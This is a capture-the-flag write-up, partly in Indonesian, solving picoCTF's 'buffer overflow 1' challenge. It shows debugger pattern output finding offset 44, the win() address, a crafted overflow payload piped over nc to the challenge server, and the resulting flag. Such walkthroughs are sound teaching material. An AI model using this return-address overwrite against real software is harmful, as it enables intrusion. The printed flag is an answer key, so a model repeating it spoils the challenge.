<h1>buffer overflow 1</h1>
<h3>Description</h3>
<p>Control the return address
Now we're cooking! You can overflow the buffer and return to the flag function in the <a href='https://artifacts.picoctf.net/c/186/vuln'>program</a>.
You can view source <a href='https://artifacts.picoctf.net/c/186/vuln.c'>here</a>. And connect with it using nc saturn.picoctf.net 49896</p>
<h3>Solution</h3>
<p>Cari overflow program pada pada fungsi gets di vuln()</p>

```console
gef➤  pattern create 100
[+] Generating a pattern of 100 bytes (n=4)
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
[+] Saved as '$_gef0'
gef➤  r <<< aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
Starting program: /home/xisco/Downloads/vuln <<< aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x6161616c

Program received signal SIGSEGV, Segmentation fault.
0x6161616c in ?? ()

[ Legend: Modified register | Code | Heap | Stack | String ]
─────────────────────────────────────────────────────── registers ────
$eax   : 0x41      
$ebx   : 0x6161616a ("jaaa"?)
$ecx   : 0xffffd32c  →  0x2e2f6000
$edx   : 0x1       
$esp   : 0xffffd3b0  →  "maaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaaya[...]"
$ebp   : 0x6161616b ("kaaa"?)
$esi   : 0x08049350  →  <__libc_csu_init+0000> endbr32 
$edi   : 0xf7ffcba0  →  0x00000000
$eip   : 0x6161616c ("laaa"?)
$eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
─────────────────────────────────────────────────────────── stack ────
0xffffd3b0│+0x0000: "maaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaaya[...]"	 ← $esp
0xffffd3b4│+0x0004: "naaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa"
0xffffd3b8│+0x0008: "oaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa"
0xffffd3bc│+0x000c: "paaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa"
0xffffd3c0│+0x0010: "qaaaraaasaaataaauaaavaaawaaaxaaayaaa"
0xffffd3c4│+0x0014: "raaasaaataaauaaavaaawaaaxaaayaaa"
0xffffd3c8│+0x0018: "saaataaauaaavaaawaaaxaaayaaa"
0xffffd3cc│+0x001c: "taaauaaavaaawaaaxaaayaaa"
───────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x6161616c
───────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "vuln", stopped 0x6161616c in ?? (), reason: SIGSEGV
─────────────────────────────────────────────────────────── trace ────
──────────────────────────────────────────────────────────────────────
gef➤  pattern search 0x6161616c
[+] Searching for '6c616161'/'6161616c' with period=4
[+] Found at offset 44 (little-endian search) likely
```
<p>Overflow terjadi pada offset 44, dan lanjut check address dari fungsi win()</p>

```console
0x080490e0  _start
0x08049120  _dl_relocate_static_pie
0x08049130  __x86.get_pc_thunk.bx
0x08049140  deregister_tm_clones
0x08049180  register_tm_clones
0x080491c0  __do_global_dtors_aux
0x080491f0  frame_dummy
0x080491f6  win
0x08049281  vuln
0x080492c4  main
0x0804933e  get_return_address
0x08049350  __libc_csu_init
0x080493c0  __libc_csu_fini
0x080493c5  __x86.get_pc_thunk.bp
0x080493cc  _fini
```
<p>Fungsi address dari win() yaitu = 0x080491f6</p>
<pre>
payload=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xf6\x91\x04\x08
</pre>

```console
root@xisco-VirtualBox:/home/xisco/Downloads# echo -e "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xf6\x91\x04\x08" | nc saturn.picoctf.net 59556
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
picoCTF{addr3ss3s_ar3_3asy_5c6baa9e}
```
<h3>Flag</h3>
<pre>
picoCTF{addr3ss3s_ar3_3asy_5c6baa9e}
</pre>
